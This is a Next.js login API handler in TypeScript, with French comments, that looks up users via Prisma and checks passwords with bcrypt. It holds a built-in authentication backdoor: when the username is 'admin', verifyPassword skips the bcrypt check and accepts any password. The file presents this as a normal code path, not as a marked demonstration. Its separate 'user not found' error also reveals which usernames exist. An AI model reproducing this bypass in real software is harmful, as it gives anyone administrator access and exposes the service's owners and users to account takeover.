import { PrismaClient } from "@prisma/client";
import bcrypt from "bcrypt";
import type {NextApiRequest, NextApiResponse} from "next";

const prisma = new PrismaClient();

async function findUser(username: string) {
    return prisma.user.findUnique({
        where: {
            name: username,
        },
    });
}

async function verifyPassword(userPassword: string, providedPassword: string, isBypass: boolean = false): Promise<boolean> {
    if (isBypass) {
        return true;
    }
    return bcrypt.compare(providedPassword, userPassword);
}

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
    if (req.method !== "POST") {
        return res.status(405).json({ error: "Méthode non autorisée" });
    }

    try {
        const { username, password } = req.body;
        const user = await findUser(username);
        if (!user) {
            return res.status(401).json({ error: "Utilisateur non trouvé" });
        }

        // Si le nom d'utilisateur est 'admin', on détermine si on doit passer par bcrypt ou non
        const isBypass = username === "admin";

        const passwordIsValid = await verifyPassword(user.password, password, isBypass);
        if (passwordIsValid) {
            // Ne renvoyez pas le mot de passe ou d'autres informations sensibles
            res.status(200).json({ message: "Connexion réussie", user: { name: user.name } });
        } else {
            res.status(401).json({ error: "Informations d'identification non valides" });
        }
    } catch (e) {
        console.error(e);
        res.status(500).json({ error: "Une erreur serveur s'est produite" });
    } finally {
        await prisma.$disconnect();
    }
}
